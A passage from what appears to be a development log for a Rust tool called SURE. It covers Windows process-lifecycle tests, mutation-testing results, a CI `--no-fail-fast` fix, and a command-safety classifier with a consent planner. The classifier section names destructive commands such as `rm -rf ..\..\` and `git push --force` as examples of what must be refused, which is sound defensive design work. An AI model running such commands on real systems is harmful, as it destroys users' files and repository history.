  boundary test wrote thousands of bytes past the bound, so "at least one byte
  was thrown away" and "more than one" agreed everywhere it was looked at. The
  suite now holds both sides of the same boundary — exactly the bound is not cut
  short, one byte past it is — and the reason there are two tests rather than one
  is written where the second one is: a check spelled `>= limit` reports every
  run that said exactly as much as it was allowed as having been cut off, and the
  two ways of being wrong point in opposite directions, one hiding a truncation
  and the other inventing one.
- **Two mutations are declared unobservable, and the harness names them instead
  of counting them as caught.** *"taskkill's own failure is read as the tree
  having been stopped"* turns `is_ok_and(|status| status.success())` into
  `is_ok_and(|_status| true)`, which differs only when `taskkill` runs and
  reports failure for a tree that in fact died — indistinguishable from the
  inside, and producing it on a machine where `taskkill` works means breaking the
  thing being measured. The neighbouring mutation, a tree killed with a program
  that is not there, *is* caught, so what the tests separate is "taskkill could
  not run" from "taskkill ran", not the three-way case in between. *"the grace
  for a stream that is still open is made an hour"* moves `DRAIN_GRACE` from five
  seconds to an hour, and on Windows nothing observable changes: the same
  `taskkill /T` that ends the child ends whatever was holding the pipe open, so
  there is no open stream left for the grace to be spent on. A test that produced
  one would have to keep a process alive on purpose and then wait the grace out —
  five seconds of every future run to observe a constant, and an hour under the
  mutation.
- **`cargo test` writes its `Running` headers to standard error and its `test
  result:` lines to standard output.** A parser that captures only stdout,
  therefore, prints a well-formed table of zeros. The arithmetic reconciling this
  build against CI was wrong in exactly that way before it was found — it
  reported "-406" and nearly every binary as "only in CI" — and the fix is
  `stderr=subprocess.STDOUT`. The trap underneath it, found the same day: a
  parser that consumes one result line per `Running` header silently drops that
  binary's children, which is `store_concurrency`'s ten, so the total came out at
  1064 where the truth was 1079. The parents are the result lines whose
  **`filtered out` is zero**, and the last number on the line is which one that
  is.
- **These tests cover most of `P3-T002`'s acceptance, and that is recorded where
  its owner will read it rather than left to be discovered.** `P3-T002` ("native
  Windows process lifecycle tests") accepts on start/timeout/cancel/output capture
  on Windows, on process-tree cleanup without Unix signals, and on paths with
  spaces and Unicode — and the runner's own contract cannot be tested without all
  three, so `process_runner.rs` has them: the tree test stops a grandchild with
  `taskkill /T` and no signal, and the working-directory test runs in
  `a directory with a space and é中文`. They are `P3-T001`'s tests and they stay,
  because they hold claims this module makes; what `P3-T002` must not do is count
  them as its own work. What is genuinely left for it is a spaces-and-Unicode
  matrix across every entry point rather than the working directory alone, and
  lifecycle coverage that is about the platform rather than about the contract.

## P3-T002 — native Windows lifecycle tests, and the assertion that proved nothing

- **The acceptance has three sentences and only one of them was a gap.**
  "Start/timeout/cancel/output capture pass on native Windows" is provenance —
  `P3-T001`'s tests hold those claims and this machine and the Windows CI job
  are where they run. "Process-tree cleanup is tested without relying on Unix
  signals" was already held by `a_stopped_run_reaches_what_the_run_started_or_says_that_it_did_not`,
  and that test turned out to have a hole (below). "Paths with spaces/Unicode
  are covered" was covered **in one position out of five**: the working
  directory. What this task adds is the other four positions and the fix to the
  tree test.

- **A path is five different things in a request, and only one of them was
  awkward.** The working directory is handed to the operating system as its own
  value; the program is a path that has to survive being turned into a command
  line; an argument is a string that goes through a command line and must arrive
  as one element; a variable's *value* is a path that goes through the
  environment block instead, a second encoding surface with its own conversion;
  and the output is the one place the direction is reversed — bytes coming back
  rather than going out. Four tests now hold the four that were missing:
  `a_program_at_a_path_with_a_space_and_unicode_is_the_program_that_runs`,
  `an_argument_that_is_not_ascii_arrives_as_one_argument_unchanged`,
  `a_report_path_with_a_space_and_unicode_is_the_path_the_child_writes_to`, and
  `what_a_program_writes_outside_ascii_comes_back_as_the_bytes_it_wrote`. One
  `const AWKWARD` and one `const NOT_ASCII` spell the awkward input once, so
  "a path with a space and a character outside ASCII" means the same thing in
  every test that uses it.

- **`NOT_ASCII` carries three problems because they fail differently.**
  `é`/`ö` are Latin-1: a byte-oriented path passes them through unchanged and a
  code-page conversion does not. `中文` is outside Latin-1, so nothing but a
  real encoding survives it. And `🎉` is **outside the Basic Multilingual
  Plane** — on Windows it is two UTF-16 code units and a surrogate pair, which
  is the case a conversion that stops at the first unit truncates and a length
  computed in code units gets wrong. A test that used one accented letter would
  pass against all three failure modes.

- **The four new tests are characterisation tests, and calling them anything
  else would be a false claim.** Nothing in the runner as it stands can be
  mutated into failing them: `OsString` round-trips on Windows, and a
  `to_string_lossy` step applied to valid Unicode is the identity, so every
  mutation that would break them is a mutation that first has to introduce a
  conversion the code has never had. What they are for is the rewrite that
  reaches for one — a raw command line, a job object, a hand-built environment
  block — and they are the four places that would notice. They are recorded as
  characterisation rather than dressed up as mutation-covered, and the one
  mutation added to the harness this time is about the position that *can* be
  got wrong in the code as written (the quotes below).

- **The tree test's central assertion proved nothing on Windows, and that was
  measured rather than argued.** The claim is "a stop reaches the whole tree",
  and its evidence was that the grandchild's report file never appeared. **A
  file that is absent is what a stopped grandchild leaves behind and also what a
  grandchild that never ran leaves behind**, so the assertion was satisfied by
  both. It is not academic: a grandchild whose name does not match the filter it
  is started with runs zero tests, exits cleanly and writes nothing. Measured
  twice, on Windows: with the grandchild's mode string changed to a name that is
  not a test, and the new marker assertion in place, the test **fails** with
  "the grandchild never started"; with that assertion removed — the old reading
  — the same run **passes**, in 3.26s, reporting `WholeTree` about a tree that
  never existed. On Unix the same change fails loudly instead, because that
  branch asserts the opposite outcome, so the hole was Windows-only: the branch
  that skipped a measurement was the branch that read an absence.

- **The fix is a positive control, and the instrument that makes it possible is
  a file the grandchild writes before it waits.** `child_waits_to_be_released`
  writes `<report>.started` the moment it is running and then waits for
  `<report>.release` to appear; the parent asserts the marker **before** it
  reads the absence, so "the stop reached it" and "it never existed" can no
  longer be confused. The release file answers the second question — is it still
  alive — by the only means available on both platforms: a process that is
  running writes within a poll and a process that was stopped cannot write at
  all. Waiting on a file rather than sleeping also takes the clock out of the
  test: the old grandchild slept 1.5s, which has to be long enough not to finish
  before the stop and short enough to be worth waiting out, and on a fast
  machine the first of those is what breaks. The given number is now a poll
  interval, and `ABANDONED` bounds what a grandchild waits when the test that
  started it has already failed — a failing test does not get to leave a process
  behind.

- **The stop is now held for both triggers, in two tests rather than one with
  two branches.** `a_cancelled_run_reaches_what_it_started_too` is the caller's
  decision where the test above is the runner's clock, and they are separate
  promises: P3-T001 already has separate contract-level tests for the two, and
  the platform-level pair is the same shape. The cancellation is asked for
  **after the grandchild's marker exists**, by a thread that waits for it, so
  the test cannot race two process starts and report a tree that was never there.
  Both tests share `a_grandchild_after_the_stop` and
  `assert_what_the_platform_could_reach`, which is where the platform's answer
  is stated once: `WholeTree` on Windows and `ProcessOnly` elsewhere, each
  asserted rather than skipped, so the day a Unix build can reach a tree the
  test fails and the report has to change on purpose.

- **One mutation was added to the harness, for the regression the program test
  exists to catch**: *"the program path is quoted, in case it has a space in
  it"* — the plausible mistake, since a path with a space is the reason to quote
  and a program path the process API was going to quote itself must not be
  quoted twice. It is caught by many tests, and **the new one is among them,
  measured rather than assumed**: with the mutation applied,
  `a_program_at_a_path_with_a_space_and_unicode_is_the_program_that_runs` fails
  alone in 0.01s with `os error 123`, `ERROR_INVALID_NAME`, before any process is
  started. The harness's own log cannot show that — it prints the first three
  catchers and this test is not among them — so the claim rests on the direct
  measurement and not on the table. What the new test adds over the others is
  the position: every other test runs a program whose path contains no space, so
  quoting it happens to work there, and it is a path that actually contains the
  space where quoting looks harmless and is not.

- **Cost, measured**: the two tree tests together take 3.3s wall-clock (they run
  concurrently; the deadline test's 2s is most of it), against 2.75s for the one
  test they replace. The file's 36 tests take about 3.3s in total.

- **One artefact from the mutation run is worth recording, because it is the
  same mutation leaving physical evidence.** With *"the program runs wherever
  SURE happens to be rather than where it was told"* applied, the batch-file
  test's own `echo it ran > ran.txt` — a redirect inside a `.cmd` the test
  writes — landed in `crates/sure-core/` rather than in the test's scratch
  directory, and `crates/sure-core/ran.txt` was sitting in the tree holding
  `it ran` when the harness finished. It was deleted. It is the module's own
  claim demonstrated by accident: a process runs in the directory it was given,
  and the difference is visible on disk.

- **What is not established.** The four matrix tests characterise today's
  behaviour and would not fail against any mutation of the runner as it stands,
  which is stated in the commit and here rather than left for a reader to
  discover. Nothing is claimed about paths that are not valid Unicode on either
  platform — `AWKWARD` and `NOT_ASCII` are both well-formed text, and a path
  that is not valid UTF-8 is a question `P3-T003`'s comparison is the right
  place to meet, not this one.

## P3-T003 — the platform matrix, and the flag that made the acceptance sentence false

- **The acceptance is about CI, and what made it false was a flag rather than a
  missing test.** "CI covers platform-specific runner behavior" needs two things
  to be true: the tests have to exist, and the CI run has to actually execute
  them. The second was false in a way no local gate could show. CI ran
  `cargo test --workspace` with no `--no-fail-fast`, so **the first failing
  target aborts every target after it** — and the targets are exactly where the
  platform-specific tests live. A failure in `sure-core --lib` would hide every
  integration target behind it, on the one run whose whole job is to say what
  *this* platform does. The local gate set had the flag all along, so the two
  command sets differed in the direction that costs a reading: the local one
  could tell you more than CI could. `.github/workflows/ci.yml` now passes it,
  and the bullet in `GITHUB_WORKFLOW.md` that read "CI has no `--no-fail-fast`"
  was rewritten rather than left — it was true when written and would have gone
  on reading as true. **The next run is the flag's own evidence, and it is
  counted rather than asserted**: `macos-latest` failed with **14 more binaries
  still to start after the failing test and 19 of the 33 parent result lines still
  to come**. Under the old command the run would have stopped there and a reader
  would have seen one target.

- **The flag's justification was a claim about cargo, and it was measured rather
  than quoted.** The sentence "the first failing target aborts the rest" had been
  in `GITHUB_WORKFLOW.md` as a known fact. It is now a measurement on this
  machine: with one deliberately failing test added to `sure-core --lib` — the
  earliest target with real content — `cargo test --workspace` **launched three
  targets** (563 passed, 1 failed) and stopped, while
  `cargo test --workspace --no-fail-fast` **launched 29** and reported all 43
  results. **Twenty-six targets, the whole of every integration test in the
  workspace, were invisible under the old command and nothing in the output said
  so.** The failing test was removed and `lib.rs` verified byte-identical to its
  committed state before anything else ran.

- **`#[cfg(unix)]` is a set of platforms, not a statement about the code — and
  this task is the second time this branch has paid for it.** The first is
  recorded in `GITHUB_WORKFLOW.md` against the four red runs before `c735a2f`,
  where a test under a bare `unix` asserted **Linux's** case rule and macOS
  disagreed. This time the row was *a path that is not text*, and the cell said
  "Linux and macOS: bytes are bytes". **That sentence is true of Linux and false
  of macOS**, and no amount of local reasoning could have found it: the machine
  this branch is developed on never compiles `#[cfg(unix)]` at all. CI said so on
  the first run — `rust (macos-latest)` in run `34929385200`, `Os { code: 92,
  kind: Uncategorized, message: "Illegal byte sequence" }`, thrown by the
  `fs::write` that was supposed to create the program. The fix is three columns
  in the table instead of two, and a test for each cell.

- **What macOS actually does is refuse the name, and the distinction from Linux
  is narrower than "Unix" suggests.** macOS holds those bytes in an `OsString` as
  happily as Linux does — `std::os::unix::ffi::OsStrExt` is available there, and
  the repository already relies on it, which is why
  `fingerprint::git::status::tests::a_path_that_is_not_valid_unicode_is_the_path_on_unix`
  passes on both. What macOS will not do is **have a file by that name**: APFS
  answers `EILSEQ`. So the two halves are a memory question and a filesystem
  question, and only the second differs. The Linux test is therefore gated
  `#[cfg(target_os = "linux")]` and not `#[cfg(unix)]`, and the macOS answer got
  a test of its own rather than being left as a comment.

- **The macOS test asserts a premise, and that is stated rather than dressed up.**
  `a_program_whose_name_is_not_valid_utf8_cannot_be_created_on_macos` comes down
  to `fs::write` failing with `EILSEQ` (92 on Darwin), plus a **control** — the
  same bytes written in the same directory under a name the filesystem will take
  — so that a permission problem or a scratch path that was never created cannot
  satisfy it instead. It checks nothing SURE wrote, because SURE is never asked
  anything: there is no request to make. It is here so the premise cannot rot
  quietly — if a later macOS or a later filesystem accepts the name, this fails
  and the row has to be rewritten **on purpose**, which is the same reason
  `assert_what_the_platform_could_reach` states the platform's answer instead of
  skipping itself.

- **Four rows, and the table is the index rather than a document.** The matrix
  lives in `process_runner.rs`'s module documentation with one column per
  platform, and **each cell is held by a test that runs on the platform it is
  about**. That is the only form in which the acceptance sentence is a fact
  instead of an intention: the three jobs compile different code, so a cell whose
  test is absent from a job's log is a cell nothing checked there. The table says
  so next to itself, with the instruction to read a run **by test name and never
  by total**.

- **Five tests, three rows, and the paired shape is the point: only the negative
  half is a contract.** "It did not run" and "it was not asked to run" are
  different facts, and a test that shows only the first is satisfied by a runner
  that refused everything. On the Unix side the two halves of *what a name may
  be* and *a file that is not an image* are one pair of tests — the same bytes
  written twice, same interpreter line, same arguments, differing in nothing but
  the mode — so the positive half holds both rows at once and the negative half
  says what a refusal looks like. The row *a path that is not text* gets an
  answer on each of the three platforms instead, because all three answer it
  differently: Linux carries the bytes through, macOS will not hold the name, and
  Windows cannot spell it.

- **The Unix pair shares one fixture and differs in one respect, which is what
  makes it about that respect.** `write_a_script` writes a two-line `/bin/sh`
  script — the smallest program a Unix test can put in front of the runner —
  and sets the mode explicitly to `0o755` or `0o644`, because **a premise the
  umask picks is not a premise**. `printf '%s'` rather than `echo`, because an
  argument under test may be bytes that are not text and `echo` is free to do
  what it likes with them. The name deliberately has no extension: on these
  platforms a name is a path and nothing else, so a runner that had learned a
  rule about extensions would have learned Windows'.

- **The negative half is about SURE, not about the operating system.** The
  without-the-bit test holds the same bytes, the same interpreter line and the
  same arguments as the positive one, so the mode is the only difference — and
  what it asserts is that the runner does not `chmod`, does not run `sh script`,
  and does not choose an interpreter of its own so that a request can succeed.
  A runner that "helpfully" made the file runnable would pass the positive test
  and fail this one.

- **A name that is not valid UTF-8 is the one case that can see a lossy
  conversion, which is why the Linux test is worth its platform gate.**
  `a_program_whose_name_is_not_valid_utf8_is_the_program_that_runs` builds the
  program with `OsString::from_vec(b"says-\xff\xfe-something")` and the argument
  with `b"an argument \xff\xfe outside UTF-8"`; the outcome carries the name back
  `as_bytes`-equal and the report the program wrote is the argument's own bytes.
  A lossy step anywhere on the way in is a different program or a different
  argument, and this is the only case where that is visible — which is also why
  the mutation the Windows test catches (below) can only be caught by a name that
  is not valid Unicode.

- **The Windows test's expected error was wrong, and the measurement corrected
  the test rather than the reverse.** The first version asserted `os error 123`,
  `ERROR_INVALID_NAME`, for a program name carrying an unpaired surrogate. **This
  machine answers `os error 2`, `ERROR_FILE_NOT_FOUND`.** The assertion was
  rewritten around what was measured, and it now holds three things:
  `NotStarted`, the name carried back byte-for-byte, and — as a **control** —
  that the message equals the one an ordinary missing name in the same directory
  produces. A control rather than a literal, because the sentence the operating
  system supplies is localized (this machine answers in Chinese) and only the
  `(os error N)` suffix is stable, and a test that hard-coded the English
  sentence would pass here and fail on the runners.

- **The mutation added this time is the mistake that is actually available in
  this code**: *"the program in the error is turned into text on the way out"*,
  `OsString::from(request.program().to_string_lossy().into_owned())` at the
  `NotStarted` site. It is caught, alone, by
  `a_program_name_that_is_not_a_windows_path_is_refused_rather_than_mangled`.
  This is the difference between this task's mutation and `P3-T002`'s: the four
  matrix tests `P3-T002` added are characterisation tests that no mutation of the
  runner as written can fail, and this one is not — the code already has the
  round trip in it, and the mutation removes it.

- **The harness is a new file rather than an edit, and the anchor is two lines
  rather than one.** `mutate19.py` is `mutate18.py` plus one mutation, written
  out because the suite changed and a harness is evidence about a specific tree.
  The new mutation's anchor includes
  `working_directory: working_directory.to_path_buf(),` as well as the `program:`
  line, because `mutate18.py` already anchors on
  `program: request.program().to_os_string(),` for a *different* replacement —
  and a one-line anchor would have made the two indistinguishable to the
  harness's own "already mutated?" preflight, which is the check that turns an
  interrupted run into a refusal instead of a table of false verdicts.

- **One `expect` message was written out because it is the one line in the file
  that can fail for a reason belonging to the machine — and the next CI run is
  where it earned that.** `the script runs` alone would have left the macOS
  failure as a bare panic with no name for its cause. The message as written said
  *"or this platform will not execute a file in the directory this test was able
  to write one to, which is a fact about the mount and not about the runner"*,
  and the failure that actually arrived was the neighbouring case: the file could
  not be **created**. Both of `write_a_script`'s failure messages are written the
  same way, and the one that fired named its own platform, path and errno in the
  log — which is how the fix was written from the log rather than from a guess.

- **What is not established.** The Unix-side tests **cannot be compiled or run on
  this machine** — `#[cfg(unix)]` code is never compiled here — so CI is their
  compiler and their only runner, and every statement about Linux and macOS in
  this entry comes from a CI log rather than from a local measurement. The macOS
  answer is measured on one filesystem (the runner's own temp directory on APFS);
  nothing here claims what a macOS machine with a differently-formatted volume
  would do, and the test that pins `EILSEQ` would be the thing that found out.
  Nothing here claims a caller may name a `.cmd`/`.bat` — the owner's decision,
  still open — and the two mutations declared unobservable, the grace for a
  stream that is still open being made an hour and `taskkill`'s own failure being
  read as the tree having been stopped, are still declared unobservable rather
  than newly covered.

## P3-T004 — the five categories, and the answer nothing SURE could read is never allowed to give

- **Nothing is `Static` unless a rule in the file says so, and that is the whole
  safety argument.** `crates/sure-core/src/safety.rs` is new and is the first
  thing in the product that reads a command line. A program the table has no row
  for, a known program with an operation the table has no name for, and a command
  line whose meaning is in text SURE cannot read all come back as **every category
  but `Static`** — not an empty set, not "unknown", not a default. A classifier
  that answered "read-only" about a command it did not recognise is the false
  green this product exists to prevent, and **it is the one mistake here that no
  later check could notice**: everything downstream would be reading a command
  SURE believed it had understood. The three causes are kept apart in `Source`
  anyway, because they have three different follow-ups — an unknown program means
  the table needs a row, an unknown operation means the same program needs a row,
  and unread text is the one more table work cannot fix, since the command line
  SURE assembled is not what decides what runs.

- **The fourth cause is the one that is easy to leave out: an argument that is not
  text SURE can read makes the whole line unread rather than being dropped.**
  Dropping one token from `git <bytes> status` leaves SURE reading the `status`
  behind the bytes and answering `Static` — about a command line it did not read.
  That is the same failure as the three above wearing a different hat, and it is
  the kind a `filter_map` or a `filter_ok` writes by accident.

- **`Destructive` has no permission that covers it, and the tempting answer is
  wrong in both directions.** `CommandClass::required_permission()` answers `None`
  for it. `WriteProject` is writing *inside* the project, which `rm -rf ..\..\` is
  not, and `git push --force` is not a write at all — so folding destruction in
  would let **a consent to write a file read as a consent to destroy the
  machine**, which is the class of mistake this module exists to prevent.
  `ungrantable()` is the door a caller uses to find that out. **What should cover
  `Destructive` is `P3-T005`'s question**, and answering it here would have put a
  permission decision inside the classifier.

- **There is no category for "writes inside the project", so the commands that do
  it are `UnknownOperation` rather than `Static` or a sixth class.** The
  acceptance names five categories and none of them is "changes files in this
  directory without destroying anything". `git commit` and `git branch -m` are
  therefore unread operations. **Inventing a sixth class would have satisfied the
  acceptance sentence by making it describe something other than the code**, and
  answering `Static` beside them would have said a command that writes the
  repository only reads it. `git pull` *is* classified, and the distinction is the
  rule: one of *its* effects is a category the vocabulary already has. `git
  branch`, `tag`, `config`, `remote`, `stash`, `cargo clean` and `npm audit` are
  absent on the rule the file writes down — **a verb is in the table only when
  every form SURE can name has an effect SURE can name**. The visible consequence
  is that `git commit` reads as "I do not know this operation" on any repository:
  a *true* answer and a temporary one, and where the sixth category lives is the
  next task's decision.

- **The answer is a set, and it is an upper bound rather than a description.**
  `cargo add serde` installs a package *and* reaches the registry, so one value
  would have to drop one of those facts. `CommandEffects` holds the categories a
  command **may** fall into and never claims it does all of them, and the
  direction is deliberate: asking for one consent too many costs a prompt, asking
  for one too few is the failure. Two rules are per-flag rather than per-program
  for the same reason. `--dry-run` takes `Install` and `Destructive` away and
  leaves `Network`, because a dry run still looks, and where a command is left
  with nothing it takes its program's own class instead — which is how `git clean
  --dry-run` reads as the report it is rather than as the deletion it is not.
  `--offline` takes away `Network` and only that spelling, because `--frozen`
  means "do not update the lockfile" to some tools and "do not touch the network"
  to others, and a rule that guessed would be reading two tools' grammars as one.

- **The classifier is not in `process`, and it takes a program and an argument
  vector rather than a `ProcessRequest`.** `process/mod.rs` holds that
  classification "belongs to a caller that has decided *whether* to run
  something, not to the machinery that runs it", and the shape follows from it:
  taking a `ProcessRequest` would make this module a caller of the runner, which
  is the edge `tests/spawn_sites.rs` exists to notice, and it would put the
  question "may I run this" on the wrong side of the thing that runs it. The
  census passes, and that is the load-bearing gate for this task rather than a
  formality.

- **A `.cmd` or `.bat` name is unread text whatever it is called and whatever is
  in it, because a name is not evidence of behaviour.** `npm.cmd` on a Windows
  `PATH` forwards to a JavaScript file, and reading the name and answering for the
  file behind it would be comfortable and would be reading a name.
  `process/mod.rs` records that Windows starts a command interpreter for such a
  name without being asked; this module's answer is that SURE cannot see what
  runs. **This is a decision stated rather than a problem dodged**, and whether a
  caller should ever be allowed to name one remains the owner's question — it is
  on the open list below.

- **The name rule is `cfg!(windows)` and not `#[cfg(windows)]`, and this run is
  where that was measured rather than asserted.** Both arms compile and the
  difference is a value, so
  `windows_elides_an_exe_suffix_and_ignores_case_and_unix_does_neither` exists and
  runs on **all three platforms**, reading the arm belonging to the platform it is
  on. The measurement: `P3-T004` added 38 test names and **not one of them is in a
  platform-gated set** — the +1 and +2 name differences between the three CI jobs
  are the sets accumulated since `P2-T004`. A task about a platform-dependent name
  rule that added zero platform-gated tests is the difference between this choice
  and `#[cfg]`, which would have put its central test in exactly one column.

- **One correction during the work, against my own first table, and a test found
  it.** `python -m pip install` was filed as `Install` alone. The integration test
  that walks the command set **SURE's own discovery builds** failed on it, and the
  domain was the authority: `ActionKind::InstallDependencies` has
  `executes_project_code()` true and `can_touch_network()` true, because a source
  distribution is built by a build backend the package brought with it and npm
  runs `preinstall`/`install`/`postinstall`/`prepare` around an install.
  Everything that may run a package's own install steps is `INSTALLS_AND_RUNS`;
  `RESOLVES` is what cargo's manifest-only operations get. **The test that caught
  it walks the commands SURE actually builds**, so a change that stops classifying
  one of them fails rather than going unnoticed — which is the form in which "the
  table holds what SURE runs" is a fact rather than an intention, and it is the
  reason the correction was found at all rather than shipped.

- **The mutation run found a real hole, and it was closed with a test rather than
  an argument.** 29 mutations, **27 caught, 2 declared unobservable**.
  `is_batch_file`'s `to_ascii_lowercase()` is a second copy of a rule `normalise`
  has already run on Windows, so **deleting it is invisible through `classify` on
  this platform** — the integration test that passes `NPM.CMD` and `thing.Bat`
  stayed green, and it is a good test that simply cannot see this. On a platform
  whose normalisation leaves the case alone it is the only copy, and what it
  protects is the *reason* SURE reports rather than the answer it gives, since an
  unknown program and unread text are both every category but `Static`. It is now
  held by a module test that calls `is_batch_file` directly, **the only surface on
  this machine where the difference exists**.

- **The harness's first run corrected my prediction about which mutations this
  platform cannot see, and the correction is the useful part.** I had declared
  that forcing the *Unix* half of the name rule would be invisible on Windows.
  Both came back CAUGHT: `cfg!` makes both arms compile and then **one of them
  runs**, so the test asserts *this machine's* rule, and forcing the other
  platform's rule into the code breaks it here. What no test on this machine can
  see is the **Windows** rule applied everywhere, because on Windows that is not a
  change at all — and that pair is what the declarations name now. Each is marked
  so that **a Unix CI run would report "DECLARED UNOBSERVABLE BUT CAUGHT"**: a
  stale declaration, which is a fact about the harness rather than about the code,
  and the intended failure. The pair is kept for that reason — it is a standing
  written record of the one behaviour in `normalise` this platform cannot check.

- **What is not established, and it is stated in the module rather than left to be
  inferred.** Nothing about **the code the command runs**: a project's test script
  can delete a directory, and that is a fact about the script. Nothing about
  **what is on `PATH`**: this reads names, does not find, stat or open the
  program, and a project that puts its own `git.exe` first is classified as git —
  finding the program is a different question, and answering it here would not
  make the answer safe, because the file can be replaced between the looking and
  the running. **No shell grammar and no wrapper is read through**: `env`,
  `timeout`, `nice`, `xargs`, `sudo` and `cmd` are not looked behind, because a
  wrapper is an argument grammar SURE would have to implement before it could see
  the program behind it, and one implemented by guesswork produces a confident
  answer about a program nobody read. **Not a list of every program SURE will ever
  run**: the table holds what SURE's own discovery names today and the neighbours a
  reader would expect, and everything else is `UnknownProgram`, which is the safe
  answer *and* a visible one. **And nothing in the product calls `classify` yet** —
  it is a module with tests and one line in `lib.rs`, and the first task that runs
  anything under it is `P3-T005`.

## P3-T005 — the plan that says what each command needs and why, and the only result a refusal can produce

- **A refused command cannot produce a passing result, and that is a property of
  the shape rather than of a test.** `PlannedCommand::refusal` is the only place
  `crates/sure-core/src/consent.rs` makes a `CheckResult` at all, and the passing
  branch does not exist in it: a command that may run returns `None`, because what
  to report about it depends on what happens when it does and nothing has happened
  yet. A refused command returns `CheckResult::not_run` — `Skipped`, with its
  reason **and its weight** kept. The weight is the half that is easy to lose and
  the half that matters: a skipped `MustFix` critical check that forgot it was
  `MustFix` is the shape of a green report assembled out of things that never
  happened. Two mutations are aimed at this bullet — a `Pass` returned where a
  `Skipped` belongs, and the same `Skipped` with `Severity::Note` and `false` —
  and both are caught.

- **The three rules are in `decide`'s order because the order is the rule, not a
  reading order.** One: every category the command may fall into is checked
  against the grants, and one missing permission is enough — first because it is
  the only one of the three that is not a question. Two: **a category with no
  permission is never covered by a grant**, so a `Destructive` command needs its
  own approval naming its exact argument vector — checked *before* the mode,
  because a cautious mode is a question to ask and a missing permission is not.
  Three: the mode last, where a command that runs project code under a mode that
  runs nothing comes back `NeedsConsent` rather than `Denied`.

- **`Destructive` still answers `None`, and this task's contribution is that a
  missing permission is not a gap in the permission set.** `P3-T004` recorded the
  question — where does the "writes inside the project" category live — and left
  it here. The answer is that it still does not live anywhere: **no sixth category
  was invented**, because the acceptance for `P3-T004` names five and satisfying
  it by adding a sixth would have made that sentence untrue. What is new is the
  other half: a category the user *cannot* grant is not a missing grant, it is a
  command that needs its own approval, and `ungrantable()`,
  `awaiting_own_approval()` and the "No permission SURE can ask for covers this"
  line in the explanation are that answer in the three places a caller needs it.
  **`git commit` reading as `UnknownOperation` is still the visible consequence**
  and is still open.

- **The `Install` finding: my first version of rule three was too permissive, and
  the test that found it is the reason the second decider could be written at
  all.** `safety::classify` answers with a *set* of categories, and
  `CommandEffects` can hold combinations no single `ActionKind` describes — so
  `decide_for` cannot delegate to `decide`, it has to restate the rules. The first
  draft's `runs_project_code` tested only for `DynamicHost`, so `npm install` under
  `inspect_only` came back `Denied` where
  `decide(ActionKind::InstallDependencies, …)` answers `NeedsConsent`: **a check
  reported as impossible that was merely unasked**, which is the same error as a
  false green wearing the other coat. Installing runs a package's own install
  steps and builds source distributions with the backend it shipped — the same
  fact `P3-T004` had to correct its command table for. The test that found it runs
  both deciders over every category that has an `ActionKind`, in every mode, under
  both a read-only and a fully granted permission set, and requires them to agree.
  **A restated rule is only safe when something checks it against the original**,
  and the mutation that re-breaks the finding is caught by that test *and* by the
  one named for the finding — which is the property worth having, since a test
  that only fails for the bug it was written for is a test nobody can refactor
  around.

- **A doc comment and its code disagreed, and the doc was right.** The first
  version of `CheckPlan::exclude` recorded the reason unconditionally while its own
  paragraph said a check the plan never held is not recorded at all. `excluded`
  now means exactly *"checks this plan contained and then took out"*, and the
  `false` it returns is the whole of what it can say about a check that was never
  there. `PermissionPlan::exclude_refused_from` returns those ids to the caller
  rather than absorbing them, because a command planned against a check the plan
  does not contain means **two check sets were assembled into one plan**, and that
  is a caller-visible anomaly rather than something to swallow. Two mutations hold
  this — the bug itself restored, and the neighbouring mistake of leaving the
  check in `dynamic_checks` while recording its reason — and the second is the one
  the doc warns about: a plan that reads as "will run" to a caller iterating one
  field and "will not run" to a reader looking at the other.

- **A census that matched a name where its rule said "spawn", fixed in the check
  rather than by renaming the type.** `tests/spawn_sites.rs` failed on
  `consent.rs` because `PlannedCommand::new(` contains the substring
  `Command::new(`. `consent.rs` builds nothing: no `std::process` import anywhere
  in the file, and its single mention of `ProcessRequest` is inside a doc comment
  explaining why `PlannedCommand::new` does not take one. **Renaming the type
  would have made the test pass and left the matcher wrong** — every future type
  whose name ends in `Command` would be a new false positive. The matcher now
  requires the character before `Command` to be one that cannot be part of an
  identifier, which is true of every spelling that really builds one. The rule is
  unchanged and **neither hole a tripwire like this can have is widened**: a bare
  alias (`use std::process::Command as C;`) was missed by the old substring search
  too. A test states the spellings the matcher must tell apart, and states the pair
  of behaviours around comments in one place, so that a reader changing one sees
  the other.

- **The mutation harness's first run found a real hole, and the fix was a test
  rather than an argument.** `target/tmp/mutate21.py` — 24 mutations, **24 caught,
  0 declared unobservable** — reported one MISSED: deleting the loop in
  `PermissionPlan::explain` that appends each command's lines left the whole suite
  green. `PlannedCommand::explain` is covered from several directions; **the
  plan's — which is the one a report actually calls, and which is the first
  acceptance sentence at the level it is printed — was covered from none.** A plan
  that names the execution mode and stops is precisely the shape this product
  exists to prevent, and no amount of reading the module would have found it. It
  is now held by `a_plan_explains_every_command_it_holds`, which takes its
  expected line count **from the commands rather than from a written-down
  number**: exact without becoming a second copy of the layout. The driver below
  `MUTATIONS` is byte-identical to `mutate20.py`'s, compared rather than copied
  carefully, because each guard in it carries a doc comment naming the false
  verdict it exists to prevent.

- **A shell pipeline reported `tee`'s exit code, not the harness's, and that is a
  false-green shape worth recording.** The first invocation was `python
  target/tmp/mutate21.py | tee …`, so a run that printed `NOT CAUGHT (1)` still
  exited 0. Nothing was concluded from it — the report is what was read, and the
  report said `NOT CAUGHT (1)` in as many words — but **the number a person
  glances at to decide whether a run passed was not the run's number**, and the
  accepted run is `set -o pipefail` plus an explicit `${PIPESTATUS[0]}`. This is
  recorded rather than quietly fixed because it is the same failure as a CI job
  colour standing in for a log: the summary of a run is not the run.

- **The test-count figures: `sum_all` and `sum_parents` are different numbers and
  the difference is a re-run, not a test.** `store_concurrency.rs` re-runs itself
  ten times with a filter, so a `cargo test` log has 44 `test result:` lines where
  34 are parents and 10 are those re-runs, and the sum over all 44 counts the ten
  re-run tests twice. **The parent sum is the number of unique tests.** By that
  measure: `P3-T003` accepted `1078`, `P3-T004` `1116`, and this task `1142` — and
  the deltas are **+38** (the 38 tests `P3-T004` added) and **+26** (the 26 this
  task added: 22 in `consent.rs`, 2 in `vocabulary.rs`, 1 in `execution.rs`, 1 in
  `tests/spawn_sites.rs`). The same 26 falls out of the source-level `#[test]`
  count, `1112 → 1138`, measured per file out of git. **For a third check, the
  per-binary invariant was verified on the Windows job: every test binary's count
  of `... ok` lines equals its own reported `passed`**, so no result line in this
  run is unaccounted for.

- **That third check does not hold, and it does not hold because the quantity it
  measures is not well-defined — corrected here because the sentence above and
  the same sentence in `P3-T005`'s acceptance note cannot be rewritten.** A test
